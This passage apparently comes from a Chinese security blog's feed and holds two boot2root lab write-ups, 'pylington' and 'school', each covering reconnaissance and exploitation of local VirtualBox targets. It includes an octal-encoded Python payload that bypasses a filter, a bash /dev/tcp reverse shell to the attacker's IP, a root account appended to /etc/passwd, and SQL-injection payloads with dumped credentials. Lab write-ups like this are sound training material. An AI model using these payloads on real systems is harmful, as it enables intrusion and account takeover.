+<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/vulnhub/pylington# arp-scan -l                                                                                                                                                             </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:3b:17:d5, IPv4: 192.168.43.92                                                                                                                                        </span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)                                                                                                                                     </span><br><span class="line">192.168.43.1    26:ca:cd:37:40:d8       (Unknown: locally administered)                                                                                                                                           </span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate                                                                                                                                                           </span><br><span class="line">192.168.43.252  08:00:27:bb:30:e2       PCS Systemtechnik GmbH                                                                                                                                                    </span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel                    </span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目标为 <code>192.168.43.252</code></li>
+<li><code>NMAP</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.252</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/vulnhub/pylington# nmap -sC -sV -p- 192.168.43.252</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 07:50 EDT</span><br><span class="line">Nmap scan report for 192.168.43.252</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 bf:ba:23:4e:69:37:69:9f:23:ae:21:35:98:4d:39:fa (RSA)</span><br><span class="line">|   256 ed:95:53:52:ef:70:1f:c0:0e:3c:d8:be:35:fc:3a:93 (ECDSA)</span><br><span class="line">|_  256 2d:b8:b0:88:52:83:7b:00:47:31:a4:76:2b:3d:7d:28 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.46 ((Unix) mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-generator: Jekyll v4.1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-robots.txt: 3 disallowed entries </span><br><span class="line">|_/register /login /zbir7mn240soxhicso2z</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Unix) mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">|_http-title: Pylington Cloud | The best way to run Python.</span><br><span class="line">MAC Address: 08:00:27:BB:30:E2 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.38 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目录扫描</li>
+</ul>
+<p><img data-src="./pylington/1.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.252/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi# gobuster dir -u http://192.168.43.252/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.252/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/19 07:50:54 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 4065]</span><br><span class="line">/register             (Status: 301) [Size: 239] [--&gt; http://192.168.43.252/register/]</span><br><span class="line">/assets               (Status: 301) [Size: 237] [--&gt; http://192.168.43.252/assets/]  </span><br><span class="line">/login                (Status: 200) [Size: 3473]                                     </span><br><span class="line">/404.html             (Status: 200) [Size: 3305]                                     </span><br><span class="line">/robots.txt           (Status: 200) [Size: 83]                                       </span><br><span class="line">                                                                                     </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/19 08:06:58 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
+<li>首页</li>
+</ul>
+<p><img data-src="./pylington/2.png" alt></p>
+<ul>
+<li>访问<a href="http://192.168.43.252/robots.txt" target="_blank" rel="noopener">http://192.168.43.252/robots.txt</a></li>
+</ul>
+<p><img data-src="./pylington/3.png" alt></p>
+<ul>
+<li>访问<a href="http://192.168.43.252/zbir7mn240soxhicso2z/" target="_blank" rel="noopener">http://192.168.43.252/zbir7mn240soxhicso2z/</a></li>
+</ul>
+<p><img data-src="./pylington/4.png" alt></p>
+<p>获得账号密码<code>steve / bvbkukHAeVxtjjVH</code></p>
+<h3 id="登入后台"><a href="#登入后台" class="headerlink" title="登入后台"></a>登入后台</h3><ul>
+<li>发现是一个<code>python</code>解释器</li>
+</ul>
+<p><img data-src="./pylington/5.png" alt></p>
+<ul>
+<li>存在<code>waf</code></li>
+</ul>
+<p><img data-src="./pylington/6.png" alt></p>
+<p><img data-src="./pylington/7.png" alt></p>
+<ul>
+<li>绕过<code>waf</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exec(<span class="number">8</span>进制)</span><br><span class="line"><span class="comment"># https://gchq.github.io/CyberChef/#recipe=To_Octal('Space')</span></span><br><span class="line">__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># \137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>成功执行</li>
+</ul>
+<p><img data-src="./pylington/8.png" alt></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.43.92&#x2F;7777 0&gt;&amp;1</span><br><span class="line">\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\61\71\62\56\61\66\70\56\64\63\56\71\62\57\67\67\67\67\40\60\76\46\61\47\51</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./pylington/9.png" alt></p>
+<p><img data-src="./pylington/10.png" alt></p>
+<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><p><img data-src="./pylington/11.png" alt></p>
+<p>或者账号密码<code>py / 54ezhCGaJV</code></p>
+<ul>
+<li>发现可以用<code>root</code>写入文件</li>
+</ul>
+<p><img data-src="./pylington/12.png" alt></p>
+<ul>
+<li>生成一个<code>root</code>权限的账号密码</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@weiyi:/home/weiyi# mkpasswd -m sha-512</span><br><span class="line">Password: </span><br><span class="line"><span class="meta">$</span><span class="bash">6<span class="variable">$yp5wO2arqdD9a0BR</span><span class="variable">$nR5ztOOaCeLWM9GmPcV2b</span>/y44tFR9NSBizYBJoUq7QfDdKfRyRSdjvfjsL7gJTCSQc8WNvmPFliMVPbplRc2z/</span></span><br><span class="line"></span><br><span class="line">weiyi:$6$yp5wO2arqdD9a0BR$nR5ztOOaCeLWM9GmPcV2b/y44tFR9NSBizYBJoUq7QfDdKfRyRSdjvfjsL7gJTCSQc8WNvmPFliMVPbplRc2z/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./pylington/13.png" alt></p>
+<p><img data-src="./pylington/14.png" alt></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>other</category>
+      </categories>
+      <tags>
+        <tag>入门</tag>
+        <tag>综合靶场测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>school</title>
+    <url>/2021/02/20/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/school/</url>
+    <content><![CDATA[<h1 id="school"><a href="#school" class="headerlink" title="school"></a>school</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
+<a id="more"></a>
+
+<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
+<li>kali2020</li>
+<li>school 2 flag</li>
+<li>windows10</li>
+</ul>
+<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.1.106</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d0:76:e7:45:6f:f9       TP-LINK TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.1.102   08:00:27:53:16:13       PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.105   38:d5:47:11:43:e9       ASUSTek COMPUTER INC.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.995 seconds (128.32 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目标为 <code>192.168.1.102</code></li>
+<li>NMAP</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.102</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">oot@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.1.102</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-20 00:16 EST</span><br><span class="line">Nmap scan report for 192.168.1.102</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA)</span><br><span class="line">|   256 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA)</span><br><span class="line">|_  256 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519)</span><br><span class="line">23/tcp open  telnet?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, ms-sql-s, oracle-tns, tn3270: </span><br><span class="line">|_    Verification Code:</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-title: 404 Not Found</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port23-TCP:V=7.80%I=7%D=2/20%Time=60309B24%P=x86_64-pc-linux-gnu%r(NULL</span><br><span class="line">SF:,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(GenericLines,</span><br><span class="line">SF:1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(tn3270,1C,"Ver</span><br><span class="line">SF:ification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(GetRequest,1C,"Verifi</span><br><span class="line">SF:cation\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(HTTPOptions,1C,"Verifica</span><br><span class="line">SF:tion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(RTSPRequest,1C,"Verificati</span><br><span class="line">SF:on\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(RPCCheck,1C,"Verification\x2</span><br><span class="line">SF:0Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(DNSVersionBindReqTCP,1C,"Verifica</span><br><span class="line">SF:tion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(DNSStatusRequestTCP,1C,"Ve</span><br><span class="line">SF:rification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(Help,1C,"Verificatio</span><br><span class="line">SF:n\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(SSLSessionReq,1C,"Verificatio</span><br><span class="line">SF:n\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(TerminalServerCookie,1C,"Veri</span><br><span class="line">SF:fication\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(TLSSessionReq,1C,"Veri</span><br><span class="line">SF:fication\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(Kerberos,1C,"Verificat</span><br><span class="line">SF:ion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(SMBProgNeg,1C,"Verification</span><br><span class="line">SF:\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(X11Probe,1C,"Verification\x20C</span><br><span class="line">SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(FourOhFourRequest,1C,"Verification\</span><br><span class="line">SF:x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LPDString,1C,"Verification\x20C</span><br><span class="line">SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LDAPSearchReq,1C,"Verification\x20C</span><br><span class="line">SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LDAPBindReq,1C,"Verification\x20Cod</span><br><span class="line">SF:e:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(SIPOptions,1C,"Verification\x20Code:\</span><br><span class="line">SF:n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LANDesk-RC,1C,"Verification\x20Code:\n\0</span><br><span class="line">SF:\0\0\xee\x1e@\0\xe2\x1c")%r(TerminalServer,1C,"Verification\x20Code:\n\</span><br><span class="line">SF:0\0\0\xee\x1e@\0\xe2\x1c")%r(NCP,1C,"Verification\x20Code:\n\0\0\0\xee\</span><br><span class="line">SF:x1e@\0\xe2\x1c")%r(NotesRPC,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\</span><br><span class="line">SF:0\xe2\x1c")%r(JavaRMI,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\</span><br><span class="line">SF:x1c")%r(WMSRequest,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c</span><br><span class="line">SF:")%r(oracle-tns,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%</span><br><span class="line">SF:r(ms-sql-s,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(afp</span><br><span class="line">SF:,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c");</span><br><span class="line">MAC Address: 08:00:27:53:16:13 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=2/20%OT=22%CT=1%CU=42722%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=60309B30%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.1.102</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 25.31 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目录扫描</li>
+</ul>
+<p><img data-src="./school/1.png" alt></p>
+<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./school/2.png" alt></p>
+<ul>
+<li>随手一个<code>sql</code>注入，万能密码登录</li>
+</ul>
+<p><img data-src="./school/3.png" alt></p>
+<p><img data-src="./school/4.png" alt></p>
+<ul>
+<li>成功进入后台</li>
+</ul>
+<p><img data-src="./school/5.png" alt></p>
+<ul>
+<li>源代码发现提示</li>
+</ul>
+<p><img data-src="./school/6.png" alt></p>
+<p>猜测存在文件上传<code>getshell</code>操作</p>
+<h3 id="sqlmap跑一波"><a href="#sqlmap跑一波" class="headerlink" title="sqlmap跑一波"></a>sqlmap跑一波</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)</span><br><span class="line">    Payload: username=1' OR NOT 5447=5447-- LQim&amp;password=1</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: username=1' OR (SELECT 6992 FROM(SELECT COUNT(*),CONCAT(0x7162786a71,(SELECT (ELT(6992=6992,1))),0x716a6a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VEgw&amp;password=1</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=1' AND (SELECT 1983 FROM (SELECT(SLEEP(5)))sPJh)-- ElNx&amp;password=1</span><br><span class="line">---</span><br><span class="line">[00:40:19] [INFO] the back-end DBMS is MySQL</span><br><span class="line">you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] web server operating system: Linux Debian 10 (buster)</span><br><span class="line">web application technology: Apache 2.4.38</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span><br><span class="line">[00:40:23] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.1.102'</span><br><span class="line"></span><br><span class="line">[*] ending @ 00:40:23 /2021-02-20/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 --dbs</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] student_attendance_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 -D "student_attendance_db" --tables</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">+-------------------+</span><br><span class="line">| attendance_list   |</span><br><span class="line">| attendance_record |</span><br><span class="line">| class             |</span><br><span class="line">| class_subject     |</span><br><span class="line">| courses           |</span><br><span class="line">| faculty           |</span><br><span class="line">| students          |</span><br><span class="line">| subjects          |</span><br><span class="line">| system_settings   |</span><br><span class="line">| users             |</span><br><span class="line">+-------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 -D "student_attendance_db" --dump</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: attendance_list</span><br><span class="line">[1 entry]</span><br><span class="line">+----+------------------+------------+---------------------+</span><br><span class="line">| id | class_subject_id | doc        | date_created        |</span><br><span class="line">+----+------------------+------------+---------------------+</span><br><span class="line">| 1  | 1                | 2020-10-28 | 2020-10-28 20:06:37 |</span><br><span class="line">+----+------------------+------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db                                                                                                                                                                                  </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------+------+-------------------+---------------------------------------------+</span><br><span class="line">| id | faculty_id | name          | type | username          | password                                    |</span><br><span class="line">+----+------------+---------------+------+-------------------+---------------------------------------------+</span><br><span class="line">| 1  | 0          | Administrator | 1    | admin             | 0192023a7bbd73250516f069df18b500 (admin123) |</span><br><span class="line">| 2  | 1          | John Smith    | 3    | jsmith@sample.com | af606ddc433ae6471f104872585cf880            |</span><br><span class="line">+----+------------+---------------+------+-------------------+---------------------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: students</span><br><span class="line">[2 entries]</span><br><span class="line">+----+----------+----------+---------------+---------------------+</span><br><span class="line">| id | id_no    | class_id | name          | date_created        |</span><br><span class="line">+----+----------+----------+---------------+---------------------+</span><br><span class="line">| 1  | 06232014 | 2        | Claire Blake  | 2020-10-28 11:53:24 |</span><br><span class="line">| 2  | 123456   | 2        | George Wilson | 2020-10-28 15:20:57 |</span><br><span class="line">+----+----------+----------+---------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: courses</span><br><span class="line">[4 entries]</span><br><span class="line">+----+---------------+---------------+---------------------+</span><br><span class="line">| id | course        | description   | date_created        |</span><br><span class="line">+----+---------------+---------------+---------------------+</span><br><span class="line">| 1  | Sample Course | Sample Course | 2020-10-28 10:00:41 |</span><br><span class="line">| 2  | Course 2      |  Course 2     | 2020-10-28 10:02:09 |</span><br><span class="line">| 3  | Course 3      |  Course 3     | 2020-10-28 10:02:16 |</span><br><span class="line">| 4  | Course 4      |  Course 4     | 2020-10-28 10:02:24 |</span><br><span class="line">+----+---------------+---------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: attendance_record</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------+------+---------------------+</span><br><span class="line">| id | student_id | attendance_id | type | date_created        |</span><br><span class="line">+----+------------+---------------+------+---------------------+</span><br><span class="line">| 1  | 1          | 1             | 1    | 2020-10-28 20:06:37 |</span><br><span class="line">| 2  | 2          | 1             | 2    | 2020-10-28 20:06:37 |</span><br><span class="line">+----+------------+---------------+------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: subjects</span><br><span class="line">[3 entries]</span><br><span class="line">+----+------------+-------------+---------------------+</span><br><span class="line">| id | subject    | description | date_created        |</span><br><span class="line">+----+------------+-------------+---------------------+</span><br><span class="line">| 1  | Subject 1  | Subject 1   | 2020-10-28 10:29:53 |</span><br><span class="line">| 2  | Subject 2  | Subject 2   | 2020-10-28 10:30:48 |</span><br><span class="line">| 3  | Subject 3  | Subject 3   | 2020-10-28 10:30:57 |</span><br><span class="line">+----+------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: faculty</span><br><span class="line">[1 entry]</span><br><span class="line">+----+----------+------------+-------------------+----------------+-------------+---------------------+</span><br><span class="line">| id | id_no    | name       | email             | contact        | address     | date_created        |</span><br><span class="line">+----+----------+------------+-------------------+----------------+-------------+---------------------+</span><br><span class="line">| 1  | 06232014 | John Smith | jsmith@sample.com | +18456-5455-55 | Sample Only | 2020-10-28 11:32:18 |</span><br><span class="line">+----+----------+------------+-------------------+----------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: class_subject</span><br><span class="line">[2 entries]</span><br><span class="line">+----+----------+------------+------------+-------------+---------------------+</span><br><span class="line">| id | class_id | faculty_id | subject_id | student_ids | date_created        |</span><br><span class="line">+----+----------+------------+------------+-------------+---------------------+</span><br><span class="line">| 1  | 2        | 1          | 1          | &lt;blank&gt;     | 0000-00-00 00:00:00 |</span><br><span class="line">| 2  | 1        | 1          | 2          | &lt;blank&gt;     | 0000-00-00 00:00:00 |</span><br><span class="line">+----+----------+------------+------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: system_settings</span><br><span class="line">[1 entry]</span><br><span class="line">+----+---------+---------+---------+----------------------+---------------+</span><br><span class="line">| id | name    | email   | contact | cover_img            | about_content |</span><br><span class="line">+----+---------+---------+---------+----------------------+---------------+</span><br><span class="line">| 1  | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; | 1604743980_shell.php | &lt;blank&gt;       |</span><br><span class="line">+----+---------+---------+---------+----------------------+---------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: class</span><br><span class="line">[3 entries]</span><br><span class="line">+----+-----------+--------+---------+-----------+---------------------+</span><br><span class="line">| id | course_id | status | level   | section   | date_created        |</span><br><span class="line">+----+-----------+--------+---------+-----------+---------------------+</span><br><span class="line">| 1  | 2         | 1      | 1       | B         | 2020-10-28 10:48:45 |</span><br><span class="line">| 2  | 2         | 1      | 1       | A         | 2020-10-28 10:52:58 |</span><br><span class="line">| 3  | 4         | 1      | 8       | 8         | 2021-02-20 05:33:52 |</span><br><span class="line">+----+-----------+--------+---------+-----------+---------------------+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>md5</code>解密</li>
+</ul>
+<p><img data-src="./school/7.png" alt></p>
+<p>目前的账号密码为:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin / admin123</span><br><span class="line">jsmith@sample.com / 06232014</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>备注:这里登录后发现一些垂直越权问题</li>
+</ul>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><ul>
+<li>前文知道，数据库中有一个系统设置的表(system_settings)</li>
+</ul>
+<p><img data-src="./school/8.png" alt></p>
+<ul>
+<li>找到隐藏文件上传点</li>
+</ul>
+<p><img data-src="./school/9.png" alt></p>
+<p><img data-src="./school/10.png" alt></p>
+<ul>
+<li>反弹<code>shell</code></li>
+</ul>
